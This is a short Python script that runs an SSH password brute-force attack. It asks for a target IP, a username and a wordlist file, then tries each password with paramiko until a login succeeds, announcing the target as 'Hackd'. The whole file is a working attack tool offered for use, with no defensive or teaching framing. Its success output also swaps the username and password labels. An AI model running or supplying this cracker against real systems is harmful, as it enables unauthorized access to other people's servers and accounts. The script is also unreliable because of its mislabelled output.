from termcolor import colored
import paramiko



def ssh_cracker():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    host = input(colored("[*] Enter Target IP: " , 'yellow'))
    user = input(colored("[*] Enter Target SSH Username: ", 'yellow'))
    passwd = input(colored("[*] Enter PasswordFile Location: ", 'yellow'))
    file = open(passwd, "r")

    for password1 in file:
        password1 = password1.strip()
        try:
            ssh.connect(hostname=host, port=22, username=user, password=password1)
            print(colored("[+] Target SSh Hackd --> ", 'green'))
            print(colored("[+] UserName: " + password1, 'green'))
            print(colored("[+] Password: " + user, 'green'))
            ssh.close()
            break
        except paramiko.ssh_exception.AuthenticationException:
            print(colored("[-] Worn Password --> " + password1, 'red'))
            ssh.close()




